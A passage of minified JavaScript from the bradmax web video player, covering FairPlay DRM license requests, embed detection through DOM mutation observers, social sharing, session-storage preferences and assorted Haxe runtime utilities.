session"),this.keySession.contentId=c,this.keySession.keyPath=this.extractContentId(b,!1),this.keySession.addEventListener("webkitkeymessage",U(this,this.onLicenseWaiting),!1),this.keySession.addEventListener("webkitkeyadded",U(this,this.onKeyAdded),!1),this.keySession.addEventListener("webkitkeyerror",U(Oa=this.videoWeb,Oa.onError),!1)},extractContentId:function(b,c){if(null==c&&(c=!0),b=this.arrayToString(b),"ezdrm"==this.drmProvider)(c=document.createElement("a")).href=b,b=c.hostname;else{if(-1==b.indexOf("skd://"))throw Error("DRM Initialization error. Cannot prepare content identifier from initData.");b=b.split("skd://")[1],c&&((c=new u("\\?.*?key[^=]*=([a-fA-F0-9]+)","")).match(b)&&(b=c.matched(1)),b=b.split("?")[0])}return b},concatInitDataIdAndCertificate:function(b,c,d){"string"==typeof c&&(c=this.stringToArray(c));var q=0,X=new ArrayBuffer(b.byteLength+4+c.byteLength+4+d.byteLength),ra=new DataView(X);return new Uint8Array(X,q,b.byteLength).set(b),q+=b.byteLength,ra.setUint32(q,c.byteLength,!0),q+=4,(b=new Uint16Array(X,q,c.length)).set(c),q+=b.byteLength,ra.setUint32(q,d.byteLength,!0),new Uint8Array(X,q+4,d.byteLength).set(d),new Uint8Array(X,0,X.byteLength)},selectKeySystem:function(){if(window.WebKitMediaKeys.isTypeSupported("com.apple.fps.1_0","video/mp4"))return"com.apple.fps.1_0";throw Error("Key System not supported")},onLicenseWaiting:function(b){13>this.videoWeb.state&&(this.videoWeb.state=13,this.setStepTimeoutTimer());var c=b.message;if("ezdrm"==this.drmProvider)(b=new XMLHttpRequest).responseType="arraybuffer",b.addEventListener("load",U(this,this.onLicenseLoadedRawBytes),!1),b.addEventListener("error",U(Oa=this.videoWeb,Oa.onError),!1),b.open("POST",this.laUrl,!0),b.setRequestHeader("Content-type","application/octet-stream"),b.send(c);else if("keyos"==this.drmProvider){(b=new L(this.laUrl)).setHeader("customdata",this.drmCustomData),b.onData=U(this,this.onLicenseLoadedBase64),b.onError=U(Oa=this.videoWeb,Oa.onError),c="spc="+this.base64EncodeUint8Array(c);var d=this.keySession.contentId;c+="&assetId="+encodeURIComponent(d),b.setPostData(c),b.request(!0)}else"default"==this.drmProvider?((b=new L(this.laUrl)).setHeader("customdata",this.drmCustomData),b.onData=U(this,this.onLicenseLoadedBase64),b.onError=U(Oa=this.videoWeb,Oa.onError),c="spc="+this.base64EncodeUint8Array(c),d=this.keySession.contentId,c+="&assetId="+encodeURIComponent(d),b.setPostData(c),b.request(!0)):null==this.currMedia.drmCustomLicenseServerHandler?(c=this.base64EncodeUint8Array(c),(b=new L(this.laUrl)).setHeader("Accept","application/json"),b.setHeader("Content-Type","application/json"),b.onData=U(this,this.onLicenseLoaded),b.onError=U(Oa=this.videoWeb,Oa.onError),b.setPostData(JSON.stringify({spc:c})),b.request(!0)):this.currMedia.drmCustomLicenseServerHandler.customFairplayLicenseRequestHandler(c,U(this,this.onCustomLicenseLoaderSuccess),U(Oa=this.videoWeb,Oa.onError),this.keySession)},onLicenseLoadedRawBytes:function(b){14>this.videoWeb.state&&(this.videoWeb.state=14,this.setStepTimeoutTimer()),this.keySession.update(new Uint8Array(b.target.response))},onLicenseLoadedBase64:function(b){14>this.videoWeb.state&&(this.videoWeb.state=14,this.setStepTimeoutTimer()),this.keySession.update(this.base64DecodeUint8Array(b))},onLicenseLoaded:function(b){14>this.videoWeb.state&&(this.videoWeb.state=14,this.setStepTimeoutTimer()),b=JSON.parse(b),b=this.base64DecodeUint8Array(b.licence),this.keySession.update(b)},onCustomLicenseLoaderSuccess:function(b){14>this.videoWeb.state&&(this.videoWeb.state=14,this.setStepTimeoutTimer()),this.keySession.update(new Uint8Array(b))},onKeyAdded:function(){this.clearStepTimeoutTimer(),this.videoWeb.state=15},onStepTimeout:function(){null!=this.videoWeb.video&&0<this.videoWeb.video.currentTime||(this.videoWeb.state=20,this.videoWeb.onError("DRM initialization error. Internal error - DRM initialisation timeout."))},stringToArray:function(b){var c=new ArrayBuffer(2*b.length);c=new Uint16Array(c);for(var d=0,q=b.length;d<q;){var X=d++;c[X]=da.cca(b,X)}return c},arrayToString:function(b){for(var c="",d=0,q=(b=new Uint16Array(b.buffer)).length;d<q;){var X=d++;c+=String.fromCodePoint(b[X])}return c},base64DecodeUint8Array:function(b){for(var c=(b=window.atob(b)).length,d=new Uint8Array(new ArrayBuffer(c)),q=0;q<c;){var X=q++;d[X]=da.cca(b,X)}return d},base64EncodeUint8Array:function(b){for(var d,q,X,ra,Aa,Qa,c="",Wa=0;Wa<b.length;)ra=(d=b[Wa++])>>2,d=(3&d)<<4|(q=Wa<b.length?b[Wa++]:null)>>4,Aa=(15&q)<<2|(X=Wa<b.length?b[Wa++]:null)>>6,Qa=63&X,null==q?Aa=Qa=64:null==X&&(Qa=64),c+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(ra)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(d)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(Aa)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(Qa);return c},__class__:Ze};var qf=function(){};wa["bs.player.plugin.video.wrapper.DashJsWrapper"]=qf,qf.__name__="bs.player.plugin.video.wrapper.DashJsWrapper",qf.prototype={getMediaPlayer:function(){return window.bradmax.dashjs.MediaPlayer().create()},__class__:qf};var ff=function(){this.detectionScripts=[]};wa["bs.player.wrapper.DetectMutation"]=ff,ff.__name__="bs.player.wrapper.DetectMutation",ff.prototype={observer:null,detectionScripts:null,destroy:function(){this.observer.disconnect(),window.document.removeEventListener("DOMNodeInserted",U(this,this.onDOMNodeInserted))},add:function(b){this.detectionScripts.push(b)},init:function(){this.isAvailable("MutationObserver")?this.initMutationObserver(window.document.body):this.isAvailable("MutationEvent")&&this.initDOMNodeInsertedEvent(window.document.body)},initMutationObserver:function(b){this.observer=new MutationObserver(U(this,this.onMutationChange)),this.observer.observe(b,{attributes:!1,childList:!0,subtree:!0,characterData:!1})},onMutationChange:function(b,c){for(c=0;c<b.length;){var d=b[c];++c,this.checkMutationRecord(d)}},checkMutationRecord:function(b){for(var c=0,d=this.detectionScripts;c<d.length;){var q=d[c];if(++c,q(b.target))break;this.checkNodeList(b.addedNodes,q)}},initDOMNodeInsertedEvent:function(b){b.addEventListener("DOMNodeInserted",U(this,this.onDOMNodeInserted))},onDOMNodeInserted:function(b){for(var c=0,d=this.detectionScripts;c<d.length;){var q=d[c];if(++c,q(b.relatedNode)){b.stopPropagation(),b.stopImmediatePropagation(),b.preventDefault();break}this.checkNodeList(b.relatedNode.childNodes,q)}},checkNodeList:function(b,c){for(var d=0;d<b.length;){var q=b[d];++d,c(q)}},isAvailable:function(b){for(var d,c=["WebKit","Moz","O","Ms",""],q=0;q<c.length;)if(d=c[q],++q,d+=b,null!=(d=m.field(window,d)))return!0;return!1},__class__:ff};var $e=function(){};wa["bs.player.wrapper.DetectScript"]=$e,$e.__name__="bs.player.wrapper.DetectScript",$e.prototype={embeder:null,divAttributeName:null,playerUrl:null,wrapperName:null,srcMap:null,url:null,videoId:null,iframe:null,thumb:null,pid:null,detect:function(){this.detectPrefixedDivs(),this.detectStaticIframes()},checkIframe:function(b){if(null==b||!(b instanceof HTMLIFrameElement)||b.hasAttribute("data-bradmax-player-pid"))return!1;for(var c=b.src,d=0,q=this.srcMap;d<q.length;){var X=q[d];if(++d,-1<c.indexOf(X))return this.preparePlayer(b),!0}return!1},getOrigin:function(){return encodeURIComponent(sb.location.origin)},wrapInSizeContainer:function(b){if(null!=b.parentElement){var c=window.document.createElement("div");c.style.width=b.offsetWidth+"px",c.style.height=b.offsetHeight+"px",b.parentElement.insertBefore(c,b),c.appendChild(b)}},preparePlayer:function(b){},createPlayer:function(b){null!=b&&this.embeder.createPlayer(b,{target:"html5",wrappedElement:b,wrapperName:this.wrapperName,wrappedVideoUrl:this.url,wrappedVideoId:this.videoId},this.pid),this.videoId=null},detectPrefixedDivs:function(){for(var c,d,q,b=window.document.getElementsByTagName("div"),X=0;X<b.length;){var ra=b[X];++X,ra.hasAttribute(this.divAttributeName)&&(c=ra.hasAttribute("data-bs-width")?ra.getAttribute("data-bs-width"):ra.offsetWidth,d=ra.hasAttribute("data-bs-height")?ra.getAttribute("data-bs-height"):ra.offsetHeight,this.videoId=ra.getAttribute(this.divAttributeName),(q=window.document.createElement("iframe")).width=c+"px",q.height=d+"px",ra.parentNode.replaceChild(q,ra),this.preparePlayer(q))}},detectStaticIframes:function(){for(var b=window.document.getElementsByTagName("iframe"),c=0;c<b.length;){var d=b[c];++c,this.checkIframe(d)}},__class__:$e};var $c=function(){};wa["bs.util.Color"]=$c,$c.__name__="bs.util.Color",$c.HexToRGB=function(b){return{r:(b=p.parseInt(f.replace(b,"#","0x")))>>16&255,g:b>>8&255,b:255&b}},$c.FloatToRGB=function(b){return{r:b>>16&255,g:b>>8&255,b:255&b}},$c.shadeColor=function(b,c){(b=$c.HexToRGB(b)).r=b.r*(100+100*c)/100|0,b.g=b.g*(100+100*c)/100|0,b.b=b.b*(100+100*c)/100|0,b.r=255>b.r?b.r:255,b.g=255>b.g?b.g:255,b.b=255>b.b?b.b:255,c=f.hex(b.r);var d=f.hex(b.g);return b=f.hex(b.b),"#"+(1==c.length?"0"+c:c)+(1==d.length?"0"+d:d)+(1==b.length?"0"+b:b)};var xe=function(){};wa["bs.util.ConfigParser"]=xe,xe.__name__="bs.util.ConfigParser",xe.stringify=function(b){return b=JSON.stringify(b),b=nd.encode(Uc.ofString(b)),b=f.replace(b,"=","_"),f.replace(b,"\n","-")},xe.parse=function(b){return b=f.replace(b,"-","\n"),b=f.replace(b,"_","="),b=nd.decode(b).toString(),JSON.parse(b)},xe.decode=function(b){var c=null;if(null==b)return c;b=decodeURIComponent(b.split("+").join(" "));try{c=JSON.parse(b)}catch(q){try{var d=nd.decode(b).toString();try{c=JSON.parse(d)}catch(X){}}catch(X){}}return c};var Ic=function(){};wa["bs.util.ConfigTools"]=Ic,Ic.__name__="bs.util.ConfigTools",Ic.getConfigValue=function(b,c){var d=null,q=qc.skinConfig;return Object.prototype.hasOwnProperty.call(q,c)&&(d=m.field(q,c)),q=b,Object.prototype.hasOwnProperty.call(q,c)&&(d=m.field(q,c)),d};var pf=function(b,c){this.reset(c),this.avgPeriod=b};wa["bs.util.EventLoadMeter"]=pf,pf.__name__="bs.util.EventLoadMeter",pf.prototype={load:null,lastEventTs:null,avgPeriod:null,add:function(b){b=this.initNowTs(b),this.load=this.getLoadForTime(b)+1,this.lastEventTs=b},getLoadForTime:function(b){return this.load*Math.exp(-(b-this.lastEventTs)/this.avgPeriod)},initNowTs:function(b){return null==b&&(b=(new Date).getTime()/1e3),b},getLoad:function(b){return this.getLoadForTime(this.initNowTs(b))},reset:function(b){this.lastEventTs=this.initNowTs(b),this.load=0},__class__:pf};var jd=function(){};wa["bs.util.ImageTools"]=jd,jd.__name__="bs.util.ImageTools",jd.getBestFitFromSet=function(b,c,d){if(null==b)return null;c=[];for(var q=d=0;q<b.length;){var X=b[q];++q,X=X.width*X.height,c.push({index:d++,score:X})}return c.sort((function(ra,Aa){return ra.score==Aa.score?0:ra.score>Aa.score?1:-1})),null==c||null==c[0]?null:b[c[0].index]},jd.coverRectangle=function(b,c,d,q,X,ra){null==X&&(X=c.calculateWidth()),null==ra&&(ra=c.calculateHeight()),null==d&&(d=b.calculateWidth()),null==q&&(q=b.calculateHeight());var Aa=ra/q;d=(c=(c=X/d)>Aa?c:Aa)*d|0,b.get_width()!=d&&b.set_width(d),q=c*q|0,b.get_height()!=q&&b.set_height(q),X=X-b.get_width()>>1,b.get_left()!=X&&b.set_left(X),ra=ra-b.get_height()>>1,b.get_top()!=ra&&b.set_top(ra)},jd.fitIntoRectangle=function(b,c,d,q,X,ra){null==X&&(X=c.calculateWidth()),null==ra&&(ra=c.calculateHeight()),null==d&&(d=b.calculateWidth()),null==q&&(q=b.calculateHeight()),d=d*(c=ra/X*d>q?X/d:ra/q)|0,b.get_width()!=d&&b.set_width(d),q=q*c|0,b.get_height()!=q&&b.set_height(q),X=X-d>>1,b.get_left()!=X&&b.set_left(X),ra=ra-q>>1,b.get_top()!=ra&&b.set_top(ra)};var rf=function(){};wa["bs.util.JsonComments"]=rf,rf.__name__="bs.util.JsonComments",rf.remove=function(b){for(;-1!=b.indexOf("/*")||-1!=b.indexOf("*/");){var c=b.indexOf("/*"),d=b.indexOf("*/",c)+2;-1!=c&&-1!=d&&(b=b.substring(0,c)+b.substring(d,b.length))}return b},rf.removeComment=function(b){var c=b.indexOf("/*"),d=b.indexOf("*/",c)+2;return-1==c||-1==d?b:b.substring(0,c)+b.substring(d,b.length)},rf.checkComments=function(b){return-1!=b.indexOf("/*")||-1!=b.indexOf("*/")};var vf=function(){};wa["bs.util.JsonParser"]=vf,vf.__name__="bs.util.JsonParser",vf.parse=function(b){for(;-1!=b.indexOf("/*")||-1!=b.indexOf("*/");){var c=b.indexOf("/*"),d=b.indexOf("*/",c)+2;-1!=c&&-1!=d&&(b=b.substring(0,c)+b.substring(d,b.length))}return JSON.parse(b)},vf.stringify=function(b,c,d){return JSON.stringify(b,c,d)};var se=function(b,c){for(null==c&&(c=2),null==b&&(b=2),this.expectedSamplesPerSec=c,this.playbackPosition=[],this.sampleTime=[],c=0;c<b;)c++,this.playbackPosition.push(null),this.sampleTime.push(null);this.lastSamplePos=0};wa["bs.util.PlaybackRateMetter"]=se,se.__name__="bs.util.PlaybackRateMetter",se.prototype={playbackPosition:null,sampleTime:null,lastSamplePos:null,expectedSamplesPerSec:null,setCurrentTime:function(b,c,d){null==d&&(d=!1),null==c&&(c=(new Date).getTime()/1e3),.05>c-this.sampleTime[this.lastSamplePos]||d||(this.lastSamplePos=(this.lastSamplePos+1)%this.playbackPosition.length,this.playbackPosition[this.lastSamplePos]=b,this.sampleTime[this.lastSamplePos]=c)},reset:function(){for(var b=0,c=this.playbackPosition.length;b<c;){var d=b++;this.playbackPosition[d]=null,this.sampleTime[d]=null}this.lastSamplePos=0},getPlaybackRate:function(b){null==b&&(b=!1);var c=this.lastSamplePos,d=(c+1)%this.playbackPosition.length,q=this.sampleTime[c],X=this.sampleTime[d],ra=q-X;return null==ra||0==ra||null==q||null==X?null:ra>1.5*(this.playbackPosition.length-1)/this.expectedSamplesPerSec&&!b?1:(this.playbackPosition[c]-this.playbackPosition[d])/ra},isPlayingNormal:function(b){return null==b&&(b=!1),.5<(b=this.getPlaybackRate(b))&&1.5>b},__class__:se};var uc=function(){};wa["bs.util.SocialShareTools"]=uc,uc.__name__="bs.util.SocialShareTools",uc.showEmbedCodeWindow=function(b,c,d){var q=uc.getEmbedCode(c);c=f.htmlEscape(q),c='<div style="padding:10px;"><small id="'+b+'-embed-code-text">'+c+"</small></div>";var Aa,X='<p style="text-align:center;"><a id="'+b+'-embed-code-copy-button" style="margin: 5px;padding: 5px 10px;cursor: pointer;background: rgba(255,255,255,0.25);">'+Yb.translate("embed_code_copy")+"</a></p>",ra='<p style="text-align:center;"><a>'+Yb.translate("embed_code_info")+"</a></p>";Aa=window.document.queryCommandSupported("copy");var Qa=new ma(ma.SHOW_MESSAGE);Qa.data={type:"info",title:Yb.translate("embed_code"),text:c+(Aa?X:ra),onAfterShow:function(){var Wa=window.document.getElementById(b+"-embed-code-text");null!=Wa&&(Wa.focus(),h.highlightHtmlNode(Wa),null!=(Wa=window.document.getElementById(b+"-embed-code-copy-button"))&&Wa.addEventListener("click",(function(){return h.copyToClipboard(q)})))},close:!0,onAfterClose:d,windowSize:{percentWidth:.85,height:200}},Qa.dispatch(b)},uc.findEmbedScriptPath=function(b,c){return null!=(b=Ic.getConfigValue(b,"playerSourcePath"))&&""!=b||null!=(b=null)&&""!=b?b:null!=c&&""!=c&&(b=window,Object.prototype.hasOwnProperty.call(b,"bradmax")&&(b=m.field(b,"bradmax"),Object.prototype.hasOwnProperty.call(b,"player")&&(b=m.field(b,"player"),Object.prototype.hasOwnProperty.call(b,"embeders")&&(b=m.field(b,"embeders"),Object.prototype.hasOwnProperty.call(b,c)&&(c=m.field(b,c),Object.prototype.hasOwnProperty.call(c,"sourcePath"))))))?m.field(c,"sourcePath"):null},uc.shareViaMail=function(b){b=uc.collectShareData(),uc.goToUrl("mailto:?subject="+b.title+"&body="+b.url,"_self")},uc.shareOnFacebook=function(b){b=uc.collectShareData(),uc.goToUrl("http://www.facebook.com/sharer.php?u="+b.url+"&t="+b.title)},uc.shareOnTwitter=function(b){b=uc.collectShareData(),uc.goToUrl("http://twitter.com/share/?url="+b.url+"&text="+b.title)},uc.shareOnLinkedIn=function(b){b=uc.collectShareData(),uc.goToUrl("http://www.linkedin.com/shareArticle?mini=true&url="+b.url+"&title="+b.title)},uc.collectShareData=function(){var b=window.top.location.href,c=window.top.document.title;return""==b||""==c?null:{url:encodeURIComponent(b),title:encodeURIComponent(c)}},uc.goToUrl=function(b,c){null==c&&(c="_blank"),window.open(b,c)},uc.getEmbedCode=function(b){for(var q,c=Tc.UID_CHARS.length,d="",X=0;24>X;){switch(q=X++,q="xxxx-xxxx-xxxx-xxxx-xxxx".charAt(q)){case"-":case"_":break;default:q=Tc.UID_CHARS.charAt(p.random(c))}d+=q}return'<div style="width: 640px; height: 480px;" id="'+(c=d)+'"></div>\n<script src="'+(d=uc.findEmbedScriptPath(b,"bradmax_player_v2.14.380"))+'" type="text/javascript" data-bs-parent-id="'+c+'" data-bs-variables="'+(b=nd.encode(Uc.ofString(JSON.stringify(b))))+'"><\/script>'};var hd=function(){};wa["bs.util.Storage"]=hd,hd.__name__="bs.util.Storage",hd.has=function(){return null!=Tb.getSessionStorage()},hd.readVolume=function(){var b=NaN,c=Tb.getSessionStorage(),d=null!=c;if(!d)return b;try{d=null,c=!1;(c=null!=Tb.getSessionStorage())&&(c=null,null!=(d=(c=Tb.getSessionStorage()).getItem("_brplayer_vol"))&&(d=f.trim(d)));null!=d&&""!=d&&(b=parseFloat(d))}catch(ra){}return b},hd.readAudio=function(){var b=null,c=Tb.getSessionStorage(),d=null!=c;if(!d)return b;try{d=null,c=!1;(c=null!=Tb.getSessionStorage())&&(c=null,null!=(d=(c=Tb.getSessionStorage()).getItem("_brplayer_aud_lang"))&&(d=f.trim(d)));null!=d&&""!=d&&(b=d)}catch(ra){}return b},hd.writeVolume=function(b){if(null!=Tb.getSessionStorage())try{null==b?Tb.getSessionStorage().removeItem("_brplayer_vol"):Tb.getSessionStorage().setItem("_brplayer_vol",da.substr(null==b?"null":""+b,0,5))}catch(d){}},hd.writeAudio=function(b){if(null!=Tb.getSessionStorage())try{null==b?Tb.getSessionStorage().removeItem("_brplayer_aud_lang"):Tb.getSessionStorage().setItem("_brplayer_aud_lang",null==b?"null":""+b)}catch(d){}},hd.readSubtitles=function(){var b=null,c=Tb.getSessionStorage(),d=null!=c;if(!d)return b;try{d=null,c=!1;(c=null!=Tb.getSessionStorage())&&(c=null,null!=(d=(c=Tb.getSessionStorage()).getItem("_brplayer_sub_lang"))&&(d=f.trim(d)));null!=d&&""!=d&&(b=d)}catch(ra){}return b},hd.writeSubtitles=function(b){if(null!=Tb.getSessionStorage())try{null==b?Tb.getSessionStorage().removeItem("_brplayer_sub_lang"):Tb.getSessionStorage().setItem("_brplayer_sub_lang",null==b?"null":""+b)}catch(d){}},hd.store=function(){return Tb.getSessionStorage()},hd.item=function(b){var c=null;return null==Tb.getSessionStorage()||null==(c=Tb.getSessionStorage().getItem(b))?c:c=f.trim(c)};var Yb=function(){};wa["bs.util.TextTools"]=Yb,Yb.__name__="bs.util.TextTools",Yb.getTextWidth=function(b,c){return null==Yb.canvasCtx&&(Yb.canvasCtx=fb.__cast(window.document.createElement("canvas"),HTMLCanvasElement).getContext("2d")),Yb.canvasCtx.font=c,Yb.canvasCtx.measureText(b).width},Yb.formatTime=function(b,c){if(null==c&&(c=!1),isNaN(b))return"";if(0>b)return"live";var d=b%60|0,q=b/60%60|0;return b=b/3600%24|0,(1==c&&10>b?"0"+b:b+"")+":"+(10>q?"0"+q:q+"")+":"+(10>d?"0"+d:d+"")},Yb.formatTimeMinutes=function(b){if(0>b)return"live";var c=b%60|0;return(10>(b=b/60|0)?"0"+b:b+"")+":"+(10>c?"0"+c:c+"")},Yb.formatDateTime=function(b,c){if(null==c&&(c=0),null==b||isNaN(b.getTime()))return"";c=(b=new Date(b.getFullYear(),b.getMonth(),b.getDay(),b.getHours(),b.getMinutes(),b.getSeconds()+c)).getSeconds();var d=b.getMinutes();return b.getHours()+":"+(10>d?"0"+d:d+"")+":"+(10>c?"0"+c:c+"")},Yb.initTranslations=function(){Yb.translations=new Jb;for(var b=0,c=m.fields(Yb.translationsJson);b<c.length;){var d=c[b];++b;var q=Yb.translations,X=new Jb;q.h[d]=X,q=m.field(Yb.translationsJson,d),d=Yb.translations.h[d],X=0;for(var ra=m.fields(q);X<ra.length;){var Aa=ra[X];++X;var Qa=Yb.decodeUtf8(m.field(q,Aa));d.h[Aa]=Qa}}},Yb.decodeUtf8=function(b){try{return decodeURIComponent(escape(b))}catch(c){return b}},Yb.translate=function(b,c,d){null==c&&(c=Yb.locale),null==Yb.translations&&Yb.initTranslations();try{return Object.prototype.hasOwnProperty.call(Yb.translations.h,c)||(c="en"),Yb.translations.h[c].h[b]}catch(q){return null}},Yb.capilizeFirstLetter=function(b){if(null==b)return null;var c=da.substr(b,0,1);return b=da.substr(b,1,b.length),c.toUpperCase()+b};var te=function(){this.h={__keys__:{}}};wa["haxe.ds.ObjectMap"]=te,te.__name__="haxe.ds.ObjectMap",te.__interfaces__=[Hc],te.prototype={h:null,set:function(b,c){var d=b.__id__;null==d&&(d=b.__id__=sb.$haxeUID++),this.h[d]=c,this.h.__keys__[d]=b},remove:function(b){return b=b.__id__,null!=this.h.__keys__[b]&&(delete this.h[b],delete this.h.__keys__[b],!0)},keys:function(){var c,b=[];for(c in this.h.__keys__)this.h.hasOwnProperty(c)&&b.push(this.h.__keys__[c]);return new qe(b)},iterator:function(){return{ref:this.h,it:this.keys(),hasNext:function(){return this.it.hasNext()},next:function(){var b=this.it.next();return this.ref[b.__id__]}}},__class__:te};var Vc=function(){};wa["bs.util.Tweener"]=Vc,Vc.__name__="bs.util.Tweener",Vc.tween=function(b,c,d){return c=new sf(b,c,d),null!=Vc.tweens.h.__keys__[b.__id__]?Vc.tweens.h[b.__id__].push(c):Vc.tweens.set(b,[c]),c},Vc.stop=function(b){if(null!=Vc.tweens.h.__keys__[b.__id__])for(var c=0,d=Vc.tweens.h[b.__id__];c<d.length;){var q=d[c];++c,q.stop()}Vc.tweens.remove(b)},Vc.pause=function(b){},Vc.resume=function(b){},Vc.reset=function(b){};var sf=function(b,c,d){this._values=[],this._delay=this._start=0,this._target=b,this._duration=c,this._properties=d,this._start=da.now()/1e3*1e3,this.initializeValues(),dd.addTween(this,U(this,this.update))};wa["bs.util._Tweener.Tween"]=sf,sf.__name__="bs.util._Tweener.Tween",sf.prototype={_delay:null,_duration:null,_target:null,_properties:null,_start:null,_fields:null,_values:null,_onUpdate:function(){},_onComplete:function(){},initializeValues:function(){this._fields=m.fields(this._properties);for(var b=0,c=this._fields;b<c.length;){var d=c[b];++b,this._values.push({name:d,start:m.getProperty(this._target,d),change:m.getProperty(this._properties,d)})}},update:function(b){if(!(0>(b=(b-this._start)/this._duration)))if(1<b){this._onComplete(),dd.removeTween(this),b=0;for(var c=this._values;b<c.length;){var d=c[b];++b,m.setProperty(this._target,d.name,d.start+(d.change-d.start))}}else{var q=wf.calculateExpoEaseOut(b);for(b=0,c=this._values;b<c.length;)d=c[b],++b,m.setProperty(this._target,d.name,d.start+(d.change-d.start)*q);this._onUpdate()}},delay:function(b){return this._delay=b,this},onComplete:function(b){return this._onComplete=b,this},onUpdate:function(b){return this._onUpdate=b,this},stop:function(){dd.removeTween(this)},pause:function(){},resume:function(){},reset:function(){},__class__:sf};var dd=function(){this.tweens=new te,this.timer=null,this.timer=new Rb(10),this.timer.run=U(this,this.update)};wa["bs.util.TickManager"]=dd,dd.__name__="bs.util.TickManager",dd.getInstance=function(){return null==dd.instance&&(dd.instance=new dd),dd.instance},dd.addTween=function(b,c){dd.getInstance().tweens.set(b,c)},dd.removeTween=function(b){dd.getInstance().tweens.remove(b)},dd.prototype={timer:null,tweens:null,update:function(){for(var b=da.now()/1e3*1e3,c=this.tweens.iterator();c.hasNext();)c.next()(b)},__class__:dd};var wf=function(){};wa["bs.util.Ease"]=wf,wf.__name__="bs.util.Ease",wf.calculateExpoEaseOut=function(b){return 1==b?1:1-Math.pow(2,-10*b)};var Tc=function(){};wa["bs.util.UUID"]=Tc,Tc.__name__="bs.util.UUID",Tc.random=function(b){null==b&&(b="xxxx-xxxx-xxxx-xxxx-xxxx");for(var q,c=Tc.UID_CHARS.length,d="",X=0,ra=b.length;X<ra;){switch(q=X++,q=b.charAt(q)){case"-":case"_":break;default:q=Tc.UID_CHARS.charAt(p.random(c))}d+=q}return d},Tc.uuidv4=function(){for(var b,d,c="",q=0;36>q;)d=q++,b=p.random(16),c="x"==(d="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".charAt(d))?c+f.hex(b):"y"==d?c+f.hex(3&b|8):c+d;return c};var nc=function(){};wa["bs.util.VideoFormatDetector"]=nc,nc.__name__="bs.util.VideoFormatDetector",nc.getTypeMap=function(){return null==nc.typeMap&&((nc.typeMap=new Jb).h.webm="file",nc.typeMap.h.mpg="file",nc.typeMap.h.mp2="file",nc.typeMap.h.mpeg="file",nc.typeMap.h.mpe="file",nc.typeMap.h.mpv="file",nc.typeMap.h.ogg="file",nc.typeMap.h.mp4="file",nc.typeMap.h.m4p="file",nc.typeMap.h.m4v="file",nc.typeMap.h.avi="file",nc.typeMap.h.wmv="file",nc.typeMap.h.mov="file",nc.typeMap.h.qt="file",nc.typeMap.h.flv="file",nc.typeMap.h.swf="file",nc.typeMap.h.m3u8="hls",nc.typeMap.h.mpd="dash",nc.typeMap.h["ism/manifest"]="mss",nc.typeMap.h["isml/manifest"]="mss"),nc.typeMap},nc.getFileExtension=function(b){return(b=b.split("."))[b.length-1]},nc.normalizeSourceUrl=function(b){return null==b?"":b.replace(nc.skipQueryParamsAndHashAncorRegex.r,"").toLowerCase()},nc.detect=function(b){var c=nc.normalizeSourceUrl(b);return""==c?"-":(c=nc.getFileExtension(c),null==(c=nc.getTypeMap().h[c])?-1!=b.indexOf(";")?nc.detect(b.replace(nc.fallbackSkipSemicolonRegex.r,"")):"-":c)};var yb=function(b,c,d){Error.call(this,b),this.message=b,this.__previousException=c,this.__nativeException=null!=d?d:this};wa["haxe.Exception"]=yb,yb.__name__="haxe.Exception",yb.caught=function(b){return b instanceof yb?b:b instanceof Error?new yb(b.message,null,b):new De(b,null,b)},yb.thrown=function(b){return b instanceof yb?b.get_native():b instanceof Error?b:new De(b)},yb.__super__=Error,yb.prototype=Ja(Error.prototype,{__skipStack:null,__nativeException:null,__previousException:null,unwrap:function(){return this.__nativeException},get_native:function(){return this.__nativeException},__class__:yb,__properties__:{get_native:"get_native"}});var Cf=function(){};wa["haxe._Int64.___Int64"]=Cf,Cf.__name__="haxe._Int64.___Int64";var Rb=function(b){var c=this;this.id=setInterval((function(){c.run()}),b)};wa["haxe.Timer"]=Rb,Rb.__name__="haxe.Timer",Rb.delay=function(b,c){var d=new Rb(c);return d.run=function(){d.stop(),b()},d},Rb.prototype={id:null,stop:function(){null!=this.id&&(clearInterval(this.id),this.id=null)},run:function(){},__class__:Rb};var De=function(b,c,d){yb.call(this,String(b),c,d),this.value=b};wa["haxe.ValueException"]=De,De.__name__="haxe.ValueException",De.__super__=yb,De.prototype=Ja(yb.prototype,{value:null,unwrap:function(){return this.value},__class__:De});var Uc=function(b){this.length=b.byteLength,this.b=new Uint8Array(b),this.b.bufferValue=b,b.hxBytes=this,b.bytes=this.b};wa["haxe.io.Bytes"]=Uc,Uc.__name__="haxe.io.Bytes",Uc.ofString=function(b,c){if(c==Fe.RawNative){for(var d=new Uint8Array(b.length<<1),q=0,X=b.length;q<X;){c=q++;var ra=b.charCodeAt(c);d[c<<1]=255&ra,d[c<<1|1]=ra>>8}return new Uc(d.buffer)}for(d=[],c=0;c<b.length;)55296<=(ra=b.charCodeAt(c++))&&56319>=ra&&(ra=ra-55232<<10|1023&b.charCodeAt(c++)),127>=ra?d.push(ra):(2047>=ra?d.push(192|ra>>6):(65535>=ra?d.push(224|ra>>12):(d.push(240|ra>>18),d.push(128|ra>>12&63)),d.push(128|ra>>6&63)),d.push(128|63&ra));return new Uc(new Uint8Array(d).buffer)},Uc.ofData=function(b){var c=b.hxBytes;return null!=c?c:new Uc(b)},Uc.prototype={length:null,b:null,getString:function(b,c,d){if(0>b||0>c||b+c>this.length)throw yb.thrown(af.OutsideBounds);null==d&&(d=Fe.UTF8);var q="",X=this.b,ra=b;switch(b+=c,d._hx_index){case 0:for(;ra<b;)if(128>(d=X[ra++])){if(0==d)break;q+=String.fromCodePoint(d)}else if(224>d)d=(63&d)<<6|127&X[ra++],q+=String.fromCodePoint(d);else if(240>d)d=(31&d)<<12|(127&(c=X[ra++]))<<6|127&X[ra++],q+=String.fromCodePoint(d);else{d=(15&d)<<18|(127&(c=X[ra++]))<<12|(127&X[ra++])<<6|127&X[ra++],q+=String.fromCodePoint(d)}break;case 1:for(;ra<b;)d=X[ra++]|X[ra++]<<8,q+=String.fromCodePoint(d)}return q},toString:function(){return this.getString(0,this.length)},__class__:Uc};var 